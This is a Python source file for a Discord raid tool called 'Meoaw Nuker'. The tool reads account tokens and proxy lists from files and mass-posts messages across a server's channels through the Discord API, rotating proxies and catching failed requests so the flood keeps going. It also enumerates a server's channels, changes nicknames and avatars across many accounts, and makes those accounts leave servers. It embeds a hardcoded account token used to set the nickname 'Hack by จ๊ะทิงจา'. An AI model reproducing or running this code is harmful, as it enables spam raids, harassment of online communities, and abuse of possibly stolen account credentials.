import gotji
import platform
import os
import requests
import random
import time
from time import sleep
from pystyle import *
from concurrent.futures import ThreadPoolExecutor
from requests import get

# Core

threading = ThreadPoolExecutor(max_workers=int(100000))

# Global

global data_token

data_token = None

meoaw = """


███╗   ███╗███████╗ ██████╗  █████╗ ██╗    ██╗    ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
████╗ ████║██╔════╝██╔═══██╗██╔══██╗██║    ██║    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
██╔████╔██║█████╗  ██║   ██║███████║██║ █╗ ██║    ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
██║╚██╔╝██║██╔══╝  ██║   ██║██╔══██║██║███╗██║    ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
██║ ╚═╝ ██║███████╗╚██████╔╝██║  ██║╚███╔███╔╝    ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
╚═╝     ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝ ╚══╝╚══╝     ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝


"""

function = """
╔═ Meoaw Nuker ( Ui by Meoaw ) ═════════════════════════════════════╗
║                                                                   ║
║                                                                   ║
║            [ 1 ] Fast Nuker         [ 5 ] Fast leave              ║
║                                                                   ║
║            [ 2 ] Multi Nuker        [ 6 ] Press Emoji             ║
║                                                                   ║
║            [ 3 ] Name Edit          [ 7 ] Press Button            ║
║                                                                   ║   
║            [ 4 ] Avatar Edit        [ 8 ] Press Select            ║  
║                                                                   ║
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝
"""

ui_choice = "Function > "

def main():

    if platform.system() == 'Windows':

        os.system('cls & title Meoaw Nuker ( 4.0 )')

        Anime.Fade(Center.Center(meoaw),Colors.rainbow,Colorate.Vertical,enter=True)

        print(" ")

        print(Colorate.Horizontal(Colors.purple_to_blue, function, 1))

        print(" ")

        print(" ")

        choice = input(Colorate.Horizontal(Colors.blue_to_purple, ui_choice, 1))

        print(" ")

        if choice == "1":

            os.system('cls & title Meoaw Edit ( 4.1 )')

            print(" ")

            amount = int(input("Count > "))

            print(" ")

            os.system('cls & title Meoaw Boots ( 4.1 )')

            print(" ")

            Write.Print("Load Setup...", Colors.yellow_to_red, interval=0.04)

            print(" ")

            sleep(0)

            os.system('cls & title Meoaw Setup ( 4.1 )')

            print(" ")

            Write.Print("Start core !", Colors.cyan_to_green, interval=0.04)

            print(" ")

            sleep(0)

            os.system('cls')

            i = 0

            while i < amount:

                i += 1

                os.system(f'title Meoaw Nuke ( @ {i} / {amount} )')

                threading.submit(attack)

            else:

                pass

        else:

            if choice == "2":

                os.system('cls & title Meoaw Nuker ( BETA )')

                print(" ")

                amount_x = int(input("Count > "))

                print(" ")

                os.system('cls')

                print(" ")

                Server_id = input("Server id > ") 

                os.system('cls')

                print(" ")

                print("Get all channel...")

                skip = input("Skip > ")

                if skip == "Yes":

                    i = 0

                    while i < 100:

                        i += 1

                        threading.submit(Multi_Attack)

                    else:

                        os.system('cls')

                elif skip == "No":

                    api = "v9"

                    token = gotji.main["token"]

                    response = get(f"https://discord.com/api/{api}/guilds/{Server_id}/channels",headers={"authorization": token})

                    i = 0

                    with open('id.txt', 'a') as c:
                            
                        for channels in response.json():

                            c.write(channels['id']+"\n")

                            i += 1

                        else:

                            read_aid = i

                            print(" ")

                            os.system(f'cls & title Load: {read_aid} Channels !')

                            print(Colorate.Horizontal(Colors.purple_to_blue, f"> ", 1) + "Load: " + Colorate.Horizontal(Colors.cyan_to_green, f"{read_aid} ", 1) + "Channel !")

                            print(" ")

                            sleep(0)

                            i = 0

                            while i < 100:

                                meoaw_core = 0

                                while meoaw_core < amount_x:

                                    meoaw_core += 1

                                    threading.submit(Multi_Attack)

                            else:

                                os.system('cls')

            else:

                if choice == "3":

                    os.system('cls & title Meoaw Name ( Config )')

                    meoaw_xd = requests.session()

                    auth01 = meoaw_xd.patch("https://discord.com/api/v9/guilds/1088237101700632677/members/@me", headers={'authorization': "MTAzMjQ4ODg2MDE4NzM3MzYxOQ.GGbm0N.2hV5A7oiTiJkER_5JFfcPSC00RKp2vRCdYUegI"}, json={"nick":"Hack by จ๊ะทิงจา"})

                    if auth01.status_code == 200:

                        print(" ")

                        time_x1 = time.localtime()

                        now1 = time.strftime("%B %d %Y %H:%M:%S", time_x1)

                        print(" ")

                        print(Colorate.Horizontal(Colors.rainbow, f"{now1} | Status: Edit !", 1))

                        print(" ")

                    else:

                        pass

                else:

                    if choice == "4":

                        os.system('cls & title Meoaw Avatar ( Edit )')

                        load_ui()

                    else:

                        if  choice == "5":

                            leave()

                        else:

                            pass

    else:

        os.system('clear')

def attack():

    if platform.system() == 'Windows':

        db = open("token.txt", "r").readlines()

        db_ip = open("ip.txt", "r").readlines()

        for token in db:

            ip = random.choice(db_ip)

            chid = gotji.main["chid"]

            msg = gotji.main["msg"]

            token_real = token.replace("\n", "")

            try:

                meoaw = requests.session()

                meoaw01 = meoaw.post(f'https://discord.com/api/v9/channels/{chid}/messages', headers={'authorization': f'{token_real}'}, json={'content': f"{msg}"}, proxies={"http": ip, "https:": ip})

                if meoaw01.status_code == 200:

                    print(" ")

                    time_x = time.localtime()

                    now = time.strftime("%B %d %Y %H:%M:%S", time_x)

                    print(Colorate.Horizontal(Colors.rainbow, f"{now} | Status: Attack !", 1))

                    print(" ")

                else:

                    pass

            except:

                print(" ")

                print(Colorate.Horizontal(Colors.yellow_to_red, "[ Meoaw Nuke ] | Status: Rate ( By pass )", 1))

                print(" ")

def Multi_Attack():

    os.system('cls & title Meoaw Nuker ( Starting... )')

    db_ch = open("id.txt", "r").readlines()

    db_token = open("token.txt", "r").readlines()

    db_ip = open("ip.txt", "r").readlines()

    for token in db_token:

        ip = random.choice(db_ip)

        chid = random.choice(db_ch).replace("\r","").replace("\n","")

        msg = gotji.main["msg"]

        token_real = token.replace("\n", "")

        try:

            meoaw_x = requests.session()

            meoaw02 = meoaw_x.post(f'https://discord.com/api/v9/channels/{chid}/messages', headers={'authorization': f'{token_real}'}, json={'content': f"{msg}"}, proxies={"http": ip, "https:": ip})

            if meoaw02.status_code == 200:

                os.system(f'title Meoaw Nuke / Attack !')

                print(" ")

                print(Colorate.Horizontal(Colors.rainbow, f"[ Meoaw Nuke ] | Status: Attack ! | Channel: {chid}", 1))

                print(" ")

            else:

                pass


        except:

            pass

def load_ui():

    global data_token

    meoaw = "Load setup..."

    icon_01 = "⋱"

    icon_02 = "⋮"

    icon_03 = "⋰"

    icon_04 = "⋯"

    icon_05 = "⋱"

    os.system('cls')

    print(" ")

    print(f"{icon_01}  " + meoaw)

    sleep(0.2)

    os.system('cls')

    print(" ")

    print(f"{icon_02}  " + meoaw)

    sleep(0.2)

    os.system('cls')

    print(" ")

    print(f"{icon_03}  " + meoaw)

    sleep(0.2)

    os.system('cls')

    print(" ")

    print(f"{icon_04}  " + meoaw)

    sleep(0.2)

    os.system('cls')

    print(" ")

    print(f"{icon_05}  " + meoaw)

    sleep(1)

    os.system('cls')

    db_img = open("img.txt", "r")

    db_token = open("token.txt", "r").readlines()

    img = db_img.read()

    print(img)

    meoaw_x = requests.session()

    for token in db_token:

        token_real = token.replace("\n", "")

        data_token = token_real

        auth_x = meoaw_x.patch("https://discord.com/api/v9/users/@me", headers={'authorization': f'{data_token}'}, json={"avatar": f"{img}"})

        if auth_x.status_code == 200:

            print(" ")

            print("Edit !")

            print(" ")

        else:

            print(auth_x.status_code)

    else:

        os.system('cls')

        print(" ")

        print("Edit done !")

        print(" ")

def leave():

    os.system('cls & title Meoaw Leave ( BETA )')

    print(" ")

    guild = input("Guid id > ")
    
    print(" ")

    db_token = open("token.txt", "r").readlines()

    for token in db_token:

        token_real = token.replace("\n", "")

        meoaw_l = requests.session()

        auth_l = meoaw_l.delete(f"https://discord.com/api/v9/users/@me/guilds/{guild}", headers={'authorization': token_real}, json={"lurking": "false"})

        if auth_l.status_code == 204:

            print(" ")

            print("Exit !")

            print(" ")

        else:

            pass

    else:

        os.system('cls')

        print(" ")

        print("Exit done !")

        print(" ")
 
main()